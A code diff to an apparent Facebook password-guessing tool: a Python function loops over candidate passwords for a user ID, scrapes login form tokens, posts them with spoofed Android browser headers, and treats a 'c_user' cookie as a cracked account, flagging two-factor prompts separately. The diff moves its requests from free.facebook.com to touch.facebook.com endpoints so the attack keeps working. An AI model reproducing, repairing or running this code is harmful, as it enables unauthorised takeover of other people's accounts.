@@ -1645,7 +1645,7 @@ def mobile(uid,pwx,tl):
         for pw in pwx:
             ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = Session.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
             data = {
             'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -1666,7 +1666,7 @@ def mobile(uid,pwx,tl):
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
             headers = {
-            'Host': 'free.facebook.com',
+            'Host': 'touch.facebook.com',
             # 'content-length': str(len(str(data))), # Content-length is usually set by requests
             'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
@@ -1681,15 +1681,15 @@ def mobile(uid,pwx,tl):
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua-platform': '"Android"',
             'accept': '*/*',
-            'origin': 'https://free.facebook.com',
+            'origin': 'https://touch.facebook.com',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"
+            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
